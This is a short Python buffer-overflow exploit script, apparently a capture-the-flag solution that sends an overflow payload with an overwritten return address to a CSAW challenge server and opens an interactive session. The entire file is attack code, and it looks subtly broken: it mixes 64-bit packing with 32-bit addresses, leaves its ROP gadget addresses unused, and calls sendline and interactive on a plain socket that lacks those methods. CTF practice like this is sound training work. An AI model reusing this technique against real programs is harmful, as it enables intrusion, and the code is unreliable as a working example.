import struct
import socket
from pwn import *
from time import sleep

def p(d):
    return struct.pack("<Q", d)

def getpayload():
    exec_cmd = 0x08049980
    add_bin = 0x08049994
    add_sh = 0x080499cf
    
    pop_ret = 0x080487f9
    pop_pop_ret = 0x08049365
    
    # First, the buffer overflow.
    payload =  "a"*0x40
    payload += p(0x40060d)
    

    return payload
    
def exploit():

    prog = socket.create_connection(("pwn.chal.csaw.io", 8000))
    prog.sendline(getpayload())
    prog.interactive()

if __name__ == "__main__":
    result = {}
    exploit()
    #print getpayload()
    #print len(getpayload())




